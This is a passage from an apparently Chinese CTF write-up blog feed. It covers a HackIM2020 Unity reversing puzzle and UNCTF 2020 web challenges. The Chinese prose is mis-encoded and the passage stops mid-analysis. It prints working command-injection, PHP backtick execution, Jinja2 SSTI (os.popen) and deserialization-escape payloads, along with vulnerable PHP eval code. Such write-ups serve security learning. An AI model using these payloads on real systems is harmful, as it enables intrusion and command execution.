href="#HackIM2020-ZeldaInSpace" class="headerlink" title="[HackIM2020]ZeldaInSpace"></a>[HackIM2020]ZeldaInSpace</h3><blockquote><p>After conquering on land.Zelda is stuck in another dimensionin Space.He will be stuck here till he solves the puzzle that thedark lord has tested him with.<br>2 platforms are connected with multiple paths between them.There are 6 weird buttons in Space, walking over which makesup a key of sorts.Help Zelda solve the Space Puzzle.</p></blockquote><p>æ ¹æ®é¢˜ç›®æè¿°å¯çŸ¥è¦åœ¨æ¸¸æˆä¸­æŒ‰ç…§é¡ºåºæ‰¾åˆ°å‡ ä¸ªæŒ‰é’®ã€‚ä½¿ç”¨ dnSpy åˆ†æ Assembly-CSharp å¯å¾—å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnGUI</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="built_in">string</span> text = stringBuilder.ToString();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.checkpoints.Count &gt;= <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="built_in">string</span> <span class="keyword">value</span> <span class="keyword">in</span> <span class="keyword">this</span>.checkpoints)</span><br><span class="line">&#123;</span><br><span class="line">stringBuilder.Append(<span class="keyword">value</span>);</span><br><span class="line">&#125;</span><br><span class="line">text = stringBuilder.ToString();</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.Equals(<span class="keyword">this</span>.checkpoints[<span class="keyword">this</span>.checkpoints.Count - <span class="number">1</span>], <span class="string">&quot;final&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.Equals(<span class="keyword">this</span>.encrypted, <span class="built_in">string</span>.Empty))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.encrypted = <span class="keyword">this</span>.Decrypt(<span class="string">&quot;pI0gDg911A3Qcf++L3rvfkwIEkXsg4jq6pwOHMgG1VlpPuE9t4eljr4fQvXUa9bMJN4TL+DzQoj8aHTe1sNt+y5FND+gqn04OOltMhv/sms=&quot;</span>, text);</span><br><span class="line">&#125;</span><br><span class="line">catch (CryptographicException ex)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.encrypted = <span class="string">&quot;wrong key Zelda! :(&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Debug.Log(<span class="keyword">this</span>.encrypted);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.encrypted = <span class="built_in">string</span>.Empty;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.Equals(text, <span class="built_in">string</span>.Empty))</span><br><span class="line">&#123;</span><br><span class="line">GUI.Label(<span class="keyword">new</span> Rect(<span class="number">0f</span>, <span class="number">5f</span>, <span class="number">400f</span>, <span class="number">105f</span>), text, <span class="keyword">this</span>.style);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.Equals(<span class="keyword">this</span>.encrypted, <span class="built_in">string</span>.Empty))</span><br><span class="line">&#123;</span><br><span class="line">GUI.Label(<span class="keyword">new</span> Rect(<span class="number">0f</span>, <span class="number">100f</span>, <span class="number">400f</span>, <span class="number">100f</span>), <span class="keyword">this</span>.encrypted, <span class="keyword">this</span>.style);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x04000020 RID: 32</span></span><br><span class="line"><span class="keyword">public</span> GUIStyle style;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x04000021 RID: 33</span></span><br><span class="line"><span class="keyword">public</span> List&lt;<span class="built_in">string</span>&gt; checkpoints;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x04000022 RID: 34</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> encrypted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¯çŸ¥åœ¨ç»è¿‡æ‰€æœ‰ checkpoint åï¼Œå¾—åˆ°çš„æ‹¼æ¥å­—ç¬¦ä¸²ä¼šä½œä¸º key å¯¹ä¸€ä¸²å­—ç¬¦ä¸²è¿›è¡Œè§£å¯†å¹¶ä¸”æ¸²æŸ“ï¼ŒçŒœæµ‹æ˜¯ flagã€‚å› æ­¤å¯¹ <code>RoomMove</code> ä¸­çš„æ–¹æ³•è¿›è¡Œåˆ†æã€‚å¾ˆå®¹æ˜“æ‰¾åˆ°å¤„ç†æ£€æŸ¥ç‚¹çš„æ–¹æ³•ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RoomMove</span></span><br><span class="line"><span class="comment">// Token: 0x06000030 RID: 48 RVA: 0x0000317C File Offset: 0x0000157C</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerEnter2D</span>(<span class="params">Collider2D other</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (other.CompareTag(<span class="string">&quot;Player&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">PlayerAttrs component = other.GetComponent&lt;PlayerAttrs&gt;();</span><br><span class="line">Debug.Log(<span class="keyword">this</span>.placeText.text);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.Equals(<span class="keyword">this</span>.placeText.text, <span class="string">&quot;CheckPoint 1!&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> a = component.checkpoints[component.checkpoints.Count - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.Equals(a, <span class="string">&quot;pepper&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">component.checkpoints.Add(<span class="string">&quot;pepper&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Debug.Log(component.checkpoints.Count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">string</span>.Equals(<span class="keyword">this</span>.placeText.text, <span class="string">&quot;CheckPoint 2!&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> a2 = component.checkpoints[component.checkpoints.Count - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.Equals(a2, <span class="string">&quot;salt&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">component.checkpoints.Add(<span class="string">&quot;salt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Debug.Log(component.checkpoints.Count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">string</span>.Equals(<span class="keyword">this</span>.placeText.text, <span class="string">&quot;CheckPoint 3!&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> a3 = component.checkpoints[component.checkpoints.Count - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.Equals(a3, <span class="string">&quot;chilly&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">component.checkpoints.Add(<span class="string">&quot;chilly&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Debug.Log(component.checkpoints.Count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">string</span>.Equals(<span class="keyword">this</span>.placeText.text, <span class="string">&quot;CheckPoint 4!&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> a4 = component.checkpoints[component.checkpoints.Count - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.Equals(a4, <span class="string">&quot;pickles&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">component.checkpoints.Add(<span class="string">&quot;pickles&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Debug.Log(component.checkpoints.Count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">string</span>.Equals(<span class="keyword">this</span>.placeText.text, <span class="string">&quot;CheckPoint 5!&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> a5 = component.checkpoints[component.checkpoints.Count - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.Equals(a5, <span class="string">&quot;oregano&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">component.checkpoints.Add(<span class="string">&quot;oregano&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Debug.Log(component.checkpoints.Count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">string</span>.Equals(<span class="keyword">this</span>.placeText.text, <span class="string">&quot;CheckPoint 6!&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> a6 = component.checkpoints[component.checkpoints.Count - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.Equals(a6, <span class="string">&quot;masala&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">component.checkpoints.Add(<span class="string">&quot;masala&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Debug.Log(component.checkpoints.Count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">string</span>.Equals(<span class="keyword">this</span>.placeText.text, <span class="string">&quot;Final&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">Debug.Log(<span class="string">&quot;Hey welcome to final!\n&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> a7 = component.checkpoints[component.checkpoints.Count - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.Equals(a7, <span class="string">&quot;final&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">component.checkpoints.Add(<span class="string">&quot;final&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Debug.Log(component.checkpoints.Count);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¯ä»¥å¾—åˆ°æ£€æŸ¥ç‚¹çš„é¡ºåºä»¥åŠæœ€ç»ˆå¾—åˆ°çš„å­—ç¬¦ä¸²</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UNCTF 2020</title>
      <link href="/zh-CN/posts/774f8257.html"/>
      <url>/zh-CN/posts/774f8257.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><p>ç®€å•çš„ç›®å½•ç©¿è¶Šï¼Œæ„é€  <code>?url=/unctf.com/../flag</code> å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214121751204/9636c5c17aa1c69f7e391a64f8387c81aa5df0a7.png" alt="image-20201115205450581"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;78ef5928-3393-4b23-a9ca-de433e161c3a&#125;</span><br></pre></td></tr></table></figure><h3 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h3><p>æ ¹æ®æç¤ºï¼Œå¯ä»¥çŸ¥é“ flag åœ¨ flag.php ä¸­ã€‚é¢˜ç›®è¿‡æ»¤äº†æ‹¬å·ï¼Œæ ¹æ® PHP çš„ç‰¹æ€§æ•´ç‚¹åå¼•å·ï¼Œå†ç”¨ od æ¥è¾“å‡ºä»¥ç»•è¿‡å­—ç¬¦çš„æ£€æµ‹ï¼Œæ„é€  <code>?a=echo `od -A d -c f???.???`; </code> å¯ä»¥å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214121904308/bedbb95d2b65798a516bfb9acd34393c2ab6b3ba.png" alt="image-20201115210404436"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;0b8654d3-3a70-4549-bf90-ef9b58d8cfef&#125;</span><br></pre></td></tr></table></figure><h3 id="UNâ€™s-online-tools"><a href="#UNâ€™s-online-tools" class="headerlink" title="UNâ€™s_online_tools"></a>UNâ€™s_online_tools</h3><p>bash æŒ‡ä»¤çš„å †å ï¼Œè¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œä½¿ç”¨ <code>%0a</code> ä½œä¸ºæŒ‡ä»¤åˆ†å‰²ï¼Œ<code>%09</code> ä½œä¸ºæŒ‡ä»¤ä¸­çš„åˆ†éš”ï¼Œæ„é€  <code>?url=1.1.1.1%0aod%09-A%09d%09-c%09/f???%0a</code> å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122167826/d153ca02a60f3375cdf9005e0701130b853219ac.png" alt="image-20201115211301682"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;d0faa519-cb49-404a-a99b-891d37c5690d&#125;</span><br></pre></td></tr></table></figure><h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><p>åœ¨ <code>/register</code> è·¯ç”±ä¸‹æ³¨å†Œç”¨æˆ·åä¸º <code>admin</code> çš„ç”¨æˆ·ååœ¨ <code>/login</code> ä¸‹ç™»å½•ï¼Œå›åˆ°é¦–é¡µåå¯ä»¥å¾—åˆ° <code>admin login success and check the secret route /secret_route_you_do_not_know</code>ã€‚</p><p>å®šä½åˆ°æç¤ºçš„è·¯ç”±ï¼Œå‘ç°ä¸€ä¸ª <code>guess</code> å‚æ•°ï¼Œå‘ç°å­˜åœ¨ SSTIã€‚ç»§ç»­å°è¯•å‘ç°å¾ˆå¤šå­—ç¬¦è¢« ban äº†ï¼Œäºæ˜¯å°è¯• attr ç»•è¿‡ã€‚ä»¥ <code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;</code> èŒƒæœ¬ï¼Œæ„é€  attr ç»•è¿‡å‚æ•°ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;(config|attr(request.args.param)|attr(request.args.param1)|attr(request.args.param2)|attr(request.args.param3)(request.args.param4)|attr(request.args.param5)(request.args.param6)|attr(request.args.param7)())&#125;&#125;</span><br><span class="line">&amp;param=__class__</span><br><span class="line">&amp;param1=__init__</span><br><span class="line">&amp;param2=__globals__</span><br><span class="line">&amp;param3=__getitem__</span><br><span class="line">&amp;param4=os</span><br><span class="line">&amp;param5=popen</span><br><span class="line">&amp;param6=ls</span><br><span class="line">&amp;param7=read</span><br></pre></td></tr></table></figure><p>å¾—åˆ° <code>__pycache__ app.py flag.txt templates error!!</code> çš„å›æ˜¾ï¼Œå¯çŸ¥ flag åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œç»§ç»­æ„é€  <code>cat flag.txt</code> å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;f1065588-34fc-4817-809d-753b58da3321&#125;</span><br></pre></td></tr></table></figure><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>å­—ç¬¦ä¸²å’Œ bool çš„ trueå¼±æ¯”è¾ƒçš„æ—¶å€™ç›¸ç­‰ï¼Œé…åˆååºåˆ—åŒ–æ§åˆ¶å˜é‡ã€‚æ„é€ å‡º payload å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;username&quot;</span>=&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="literal">true</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure><p>å¾—åˆ° <code>a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</code>ã€‚å°†å…¶ä»¥ POST çš„æ–¹å¼ä½œä¸ºå‚æ•° <code>data</code> ä¼ é€ï¼Œå³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122403630/b391e6a29b3c7684719dd2935586df66b14b71f0.png" alt="image-20201115221423513"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;40371f04-6f0f-4eb9-8768-85e503928711&#125;</span><br></pre></td></tr></table></figure><h3 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h3><p>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œå…³é”®åœ¨äº <code>return str_replace(&#39;challenge&#39;, &#39;easychallenge&#39;, $string);</code> çš„å°‘å˜å¤šçš„æ“ä½œï¼Œå¯ä»¥åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²æœ«å°¾æ‹¼æ¥é€ƒé€¸ã€‚è®¡ç®—é€ƒé€¸å­—ç¬¦æ•°å¹¶æ„é€  payload å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> filter(serialize(<span class="keyword">new</span> a(<span class="string">&quot;LemonPrefectchallengechallengechallengechallengechallengechallengechallengechallenge\&quot;;s:8:\&quot;password\&quot;;s:4:\&quot;easy\&quot;;&#125;nox&quot;</span>, <span class="string">&quot;easy&quot;</span>)));</span><br></pre></td></tr></table></figure><p>å¾—åˆ° <code>O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:116:&quot;LemonPrefecteasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;nox&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>ï¼Œå°†å…¶ä¸­éœ€è¦å¡«å…¥çš„å‚æ•°å–å‡ºï¼Œæ„é€ å¾— <code>?1=LemonPrefecteasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;nox</code>ã€‚å°†æ„é€ æ‰€å¾—å‚æ•°ä½œä¸º GET å‚æ•°å‘èµ·è¯·æ±‚å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214122647160/faf716599f6680c58b30331b208d16f5fef0b694.png" alt="image-20201115223022446"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;78cae2f3-89df-4ae3-a63c-23ef9efa0383&#125;</span><br></pre></td></tr></table></figure><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>æŸ¥çœ‹ response header ä¸­çš„ <code>X-Powered-By: PHP/7.4.5</code>ï¼Œ æŸ¥é˜…æ‰‹å†Œå¯çŸ¥ä»£ç ä¸­éƒ¨åˆ†å‡½æ•°å·²ç»è¢«åœç”¨ï¼Œè¿›è€Œç®€åŒ–ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$adminPassword</span> = <span class="string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getVars</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$totals</span> = array_merge(<span class="variable">$_GET</span>, <span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">if</span> (count(<span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $&#123;<span class="variable">$key</span>&#125;;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="variable">$temp_array</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$key2</span> =&gt; <span class="variable">$value2</span>) &#123;</span><br><span class="line">                    <span class="variable">$temp_array</span>[<span class="variable">$key2</span>] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim(<span class="variable">$value2</span>))));</span><br><span class="line">                &#125;</span><br><span class="line">                $&#123;<span class="variable">$key</span>&#125; = <span class="variable">$_GET</span>[<span class="variable">$key</span>] = <span class="variable">$temp_array</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $&#123;<span class="variable">$key</span>&#125; = <span class="variable">$_GET</span>[<span class="variable">$key</span>] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim(<span class="variable">$value</span>))));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åªæœ‰adminæ‰èƒ½è®¾ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$password</span>) === <span class="variable">$adminPassword</span> &amp;&amp; sha1(<span class="variable">$verif</span>) == <span class="variable">$verif</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can set config variables!!&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys(<span class="variable">$GLOBALS</span>) <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="variable">$key</span>) &amp;&amp; strlen(<span class="variable">$GLOBALS</span>[<span class="variable">$key</span>]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> strlen((<span class="variable">$GLOBALS</span>[<span class="variable">$key</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys(<span class="variable">$GLOBALS</span>) <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="variable">$GLOBALS</span>[<span class="variable">$key</span>]) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®¡è®¡å¯çŸ¥æ‰€æœ‰è¯·æ±‚å˜é‡ä¼šè¢«è®¾ç½®è‡³å…¨å±€ï¼ŒåŒæ—¶æ‰€æœ‰å•å¼•å·å’ŒåŒå¼•å·å‡ä¼šè¢«åŠ ä¸Šåæ–œæ 